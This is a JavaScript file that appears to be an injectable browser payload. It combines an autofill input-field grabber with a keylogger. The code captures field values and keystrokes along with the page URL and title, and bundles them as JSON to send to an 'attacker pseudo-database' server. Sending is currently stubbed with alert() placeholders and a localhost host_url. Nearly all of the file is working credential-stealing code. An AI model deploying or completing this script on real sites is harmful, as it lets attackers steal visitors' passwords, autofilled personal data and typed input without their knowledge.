/* attacker pseudo-database / server */
var host_url = "http://127.0.0.1:80/"


/* ## Input Field Grabber - Mainly for stealing autofill ## */

/* get a list of all the input fields */
allInputs = document.getElementsByTagName('input');
for (var i = 0; i < allInputs.length; i++) {
    /* When a field loses focus for the first time, save and send to catch autofilled fields */
    allInputs[i].addEventListener('blur',function(e) {
        saveAndSendInputField(e.target);
    },{once:true});
}

/* Sends to an input field only endpoint */
function saveAndSendInputField(target) {
    /* output JSON */
    var curInput = {} 
    /* Get current time */
    var now = new Date();
    curInput['timestamp'] = now.getDate()+'-'+(now.getMonth()+1)+'-'+now.getFullYear()+' '+now.getHours()+':'+now.getMinutes()+':'+now.getSeconds();
    /* Get current URL */
    curInput['url'] = document.URL;
    /* Get current title */
    curInput['title'] = document.title;
    /* Get field name */
    curInput['type'] = target.name;
    /* Set content */
    curInput['content'] = target.value;
    /* Send to remote server */
    alert(JSON.stringify(curInput)); // placeholder
}


/* ## Keylogger ## */

/* Temporary array of keypresses for the current page / form, reset and sent whenever we assume the user is done with a given input  */
var curlog = [];

/* On keydown event, log the keystroke */
document.addEventListener('keydown',function(e) {
    /* Some browsers won't give this listener the actual event, so we get it using a legacy feature */
    e = e || window.event;
    var curChar = e.key
    if (curChar) {
        /* If we get a Shift keypress, capitalise the next letter instead */
        if (curlog[curlog.length - 1] === 'Shift' && curChar.length === 1) {
            curlog[curlog.length - 1] = curChar.toLocaleUpperCase();
        /* Else just add the letter to the log */
        } else {
            curlog.push(curChar);
        }
        
        /* If it's any of these, the user is done with this input box and we can send */
        if (curChar == "Tab") {
            saveAndSendKS();
        }
        if (curChar == "Enter") {
            saveAndSendKS();
        }
    }
});

/* On click event, save and send the current log */
document.addEventListener('mousedown',function() {
    saveAndSendKS();
});

/* Send user input before user leaves webpage or close tab/window*/
window.onbeforeunload = function() {
    saveAndSendKS();
}

/* Construct a JSON to send, clear the log for the next input box */
function saveAndSendKS() {
    if (curlog.length === 0) { return; }
    /* output JSON */
    var curMessage = {} 
    /* Get current time */
    var now = new Date();
    curMessage['timestamp'] = now.getDate()+'-'+(now.getMonth()+1)+'-'+now.getFullYear()+' '+now.getHours()+':'+now.getMinutes()+':'+now.getSeconds();
    /* Get current URL */
    curMessage['url'] = document.URL;
    /* Get current title */
    curMessage['title'] = document.title;
    /* Set and clear log */
    curMessage['content'] = curlog;
    curlog = [];
    /* Send to remote server */
    alert(JSON.stringify(curMessage)); // placeholder
}